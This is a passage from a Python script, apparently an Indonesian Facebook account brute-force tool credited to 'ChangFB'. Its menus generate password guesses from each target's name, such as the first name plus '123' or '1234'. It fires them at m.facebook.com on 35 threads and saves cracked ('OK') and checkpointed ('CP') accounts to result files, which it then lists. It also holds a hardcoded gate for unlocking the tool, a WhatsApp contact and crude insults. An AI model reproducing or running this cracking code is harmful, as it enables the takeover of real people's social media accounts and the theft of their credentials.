            xx = "m.facebook.com"
            self.kombinasi_pw(xx)
        else:
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()

    def kombinasi_pw(self,url):
        print('%s\x1b[1;97m|──────────────────────────────────────────────────────\n%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Pengaturan Kata sandi Menu%s'%(H,H,H))
        print('%s%s%s\x1b[1;97m|——[\x1b[1;92m1\x1b[1;97m] Kata sandi 1'%(H,H,H))
        print('%s%s%s\x1b[1;97m|——[\x1b[1;92m2\x1b[1;97m] Kata sandi 2'%(H,H,H))
        pw = input(f"\x1b[1;97m|─╭[Metode]─────────────────────────────────────────────\n| ╰─➣\x1b[1;92m\x1b[1;97m ")
        if pw in[""]:
            print(f"\x1b[1;97m|\x1b[1;97m ╭────── \x1b[1;93m─━\x1b[1;96m㋱\x1b[1;93m•\x1b[1;92m[\x1b[1;97mMulti Brute Force Facebook\x1b[1;92m]\x1b[1;93m•\x1b[1;96m㋱\x1b[1;93m━─ \x1b[1;97m──────╮\n|\x1b[1;97m │\x1b[1;96m     _________ .__                                  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m             \/     \/     \/     \//_____/         \x1b[1;97m│\n|\x1b[1;97m │ Whatsapp  : 0822-6131-0817         \x1b[1;90mVersion\x1b[1;97m :  \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10\x1b[1;97m │\n|\x1b[1;97m ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n\x1b[1;97m|───────────────────────────────────────────────────────\n\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Jangan Kosong");self.kombinasi_pw(url)
        elif pw in["1","01"]:
            print('%s\x1b[1;97m|\x1b[1;97m ╭────── \x1b[1;93m─━\x1b[1;96m㋱\x1b[1;93m•\x1b[1;92m[\x1b[1;97mMulti Brute Force Facebook\x1b[1;92m]\x1b[1;93m•\x1b[1;96m㋱\x1b[1;93m━─ \x1b[1;97m──────╮\n|\x1b[1;97m │\x1b[1;93m     _________ .__                                  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m             \/     \/     \/     \//_____/         \x1b[1;97m│\n|\x1b[1;97m │ Whatsapp  : 0822-6131-0817         \x1b[1;90mVersion\x1b[1;97m :  \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10\x1b[1;97m │\n|\x1b[1;97m ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n\x1b[1;97m|───────────────────────────────────────────────────────\n%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] OK : results/OK-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] CP : results/CP-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s\x1b[1;97m|───────────────────────────────────────────────────────\n%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] The Changcuters\n%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Gunakan Mode Pesawat Jika Tidak Ada Hasil\n%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] To Stop %sCTRL+c%s on keyboard\n\x1b[1;97m|───────────────────────────────────────────────────────'%(H,H,H,H,H,H,H,H,H))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123",xz[0]+"1234"]
                       else:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123",xz[0]+"1234"]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif pw in["2","02"]:
            print('%s\x1b[1;97m|\x1b[1;97m ╭────── \x1b[1;93m─━\x1b[1;96m㋱\x1b[1;93m•\x1b[1;92m[\x1b[1;97mMulti Brute Force Facebook\x1b[1;92m]\x1b[1;93m•\x1b[1;96m㋱\x1b[1;93m━─ \x1b[1;97m──────╮\n|\x1b[1;97m │\x1b[1;93m   _________                                  .__   \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m  /   _____/__.__._____    _____   ________ __|  |  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m  \_____  <   |  |\__  \  /     \ /  ___/  |  \  |  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m  /        \___  | / __ \|  Y Y  \\___ \|  |  /  |__ \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m /_______  / ____|(____  /__|_|  /____  >____/|____/\x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m         \/\/          \/      \/     \/   \x1b[1;90mV \x1b[1;97m: \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10 \x1b[1;97m│\n|\x1b[1;97m ╰[\033[41m\033[1;37m Author : ChangFB \x1b[0m]────────────────────────────────╯\n\x1b[1;97m|───────────────────────────────────────────────────────\n%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] OK : results/OK-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] CP : results/CP-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s\x1b[1;97m|───────────────────────────────────────────────────────\n%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] The Changcuters\n%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Gunakan Mode Pesawat Jika Tidak Ada Hasil\n%s%s\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] To Stop %sCTRL+c%s on keyboard\n\x1b[1;97m|───────────────────────────────────────────────────────'%(H,H,H,H,H,H,H,H,H)) 
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('|')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
            
def result():
	print(f'\x1b[1;97m|——[\x1b[1;92m1\x1b[1;97m] Hasil OK Anda ')
	print(f'\x1b[1;97m|——[\x1b[1;92m2\x1b[1;97m] Hasil CP Anda ')
	print(f'\x1b[1;97m|——[\x1b[1;92m3\x1b[1;97m] Kembali	')
	kz = input(f'|─╭[Pilih]──────────────────────────────────────────────\n| ╰─➣\x1b[1;92m\x1b[1;97m ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] File Tidak Di Temukan ')
			time.sleep(3)
			file()
		if len(vin)==0:
			print('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] %s. %s ( %s Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]')
			geeh = input('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] {cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'[ Klik Enter ]')
			file()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] %s. %s ( %s Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] %s. %s ( %s Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Pilih Yang Bener Kontol ')
				file()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] File Tidak Di Temukan ')
				time.sleep(2)
				file()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] {cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'[Klik Enter]')
			back()
	elif kz in ['3']:
		file()
	else:
		print('\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Pilih Yang Bener Kontol ')
		file()		     

user = "Chang"
pwas ="FB"
def alok():
    try:
        open(".ini_pw.txt", "r").read()
    except FileNotFoundError:
        os.system("clear")
        logo()
        print('%s%s\x1b[1;97m╭───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m[\x1b[1;92mFACEBOOK INDONESIA\x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │\033[32m    _    ____ ____ _ _  _    ___  _  _ _    _  _    \x1b[1;97m│\x1b[1;97m\n\x1b[1;97m│ │\033[32m    |    |  | | __ | |\ |    |  \ |  | |    |  |    \x1b[1;97m│\n\x1b[1;97m│ │\033[32m    |___ |__| |__] | | \|    |__/ |__| |___ |__|    \x1b[1;97m│\n\x1b[1;97m│ ╰────────────────────────────────────────────────────╯\n\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Hubungi Admin Jika Premium\n\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] SC Ini %sPREMIUM%s'%(M,N,H,N))
        print('%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Menu Tools%s'%(BM,P,N))
        print('%s%s\x1b[1;97m├───────────────────────────────────────────────────────\n\x1b[1;97m├───\x1b[1;97m[\033[32m1\x1b[1;97m]  Login Ke Tools'%(H,N))
        print('%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m2\x1b[1;97m]  Hubungi Admin'%(H,N))
        pil = input(' %s%s%s\x1b[1;97m├──╭[\033[32mMENU\x1b[1;97m]──────────────────────────────────────────────\n│  ╰─➣\x1b[1;97m '%(N,K,N))
        if pil =="":
            jalan(f"\x1b[1;97m╭───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m [ \x1b[1;92mThe Changcuters \x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │\x1b[38;5;208m     _________ .__                                  \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n\x1b[1;97m│ │\x1b[38;5;208m             \/     \/     \/     \//_____/         \x1b[1;97m│\n\x1b[1;97m│ │ Whatsapp  : 0822-6131-0817                         │ \n\x1b[1;97m│ ╰────────────────────────────────────────────────────╯\n\x1b[1;97m╰───\x1b[1;97m[\033[32m+\x1b[1;97m] Sorry, it is wrong...!");time.sleep(1);alok()
        elif pil in["2","02"]:
            jalan(" %s%s%s \x1b[1;97m[\x1b[1;96m+\x1b[1;97m]  %sAnda Akan Diarahkan Ke Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open http://www.wasap.my/6282261310817?text=Enggak+Menerima+Bocil²+Bangsat+OK');time.sleep(2);alok()
        elif pil in["1","01"]:
            print('%s\x1b[1;97m├───────────────────────────────────────────────────────'%(N))
            print(' %s%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Masukan %sUsername & Password%s Untuk Masuk Ke Tools!'%(N,M,N,H,N))
        else:
            exit(f"\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Maaf Salah...!")
        pw = input("%s%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Enter Username : %s"%(N,K,N,H))
        loading()
        if pw in [""]:
            jalan("%s%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Maaf Jangan Kosong!"%(N,M,N));time.sleep(1);alok()
        elif pw in user:
            jalan("%s%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] OK Nama Pengguna benar"%(N,H,N));time.sleep(1);kska()
        else:
            jalan("%s%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Maaf, Salah Nama Pengguna"%(N,M,N));time.sleep(1);alok()
    file()
def kska():
    xx = input("%s%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Enter Password : %s"%(N,K,N,H))
    loading()
    if xx in[""]:
        jalan("%s%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Maaf Jangan Kosong!"%(N,M,N));time.sleep(1);alok()
    elif xx in pwas:
        jalan("%s%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] OK Kata Sandi Benar"%(N,H,N));time.sleep(2);open(".ini_pw.txt", "a").write(xx);file()
    else:
        jalan("%s%s%s\x1b[1;97m├───\x1b[1;97m[\033[32m+\x1b[1;97m] Maaf, Kata Sandi Salah"%(N,M,N));time.sleep(1);alok()   
          
if __name__ == '__main__':
    alok()
